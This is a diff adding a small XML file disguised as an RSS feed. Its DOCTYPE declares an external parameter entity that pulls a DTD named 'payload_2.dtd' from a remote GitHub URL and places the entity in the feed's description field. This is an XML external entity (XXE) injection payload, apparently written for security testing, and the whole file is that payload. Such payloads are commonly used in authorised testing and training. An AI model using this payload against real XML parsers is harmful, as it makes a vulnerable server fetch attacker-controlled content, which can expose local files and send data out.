@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<!DOCTYPE a [
+	<!ENTITY % ext SYSTEM "https://raw.githubusercontent.com/chrislam82/XML_test_82/master/payload_2.dtd">
+	%ext;
+]>
+
+<rss>
+	<channel>
+		<item>
+			<title></title>
+			<link></link>
+			<description>&ext;</description>
+		</item>
+	</channel>
+</rss>
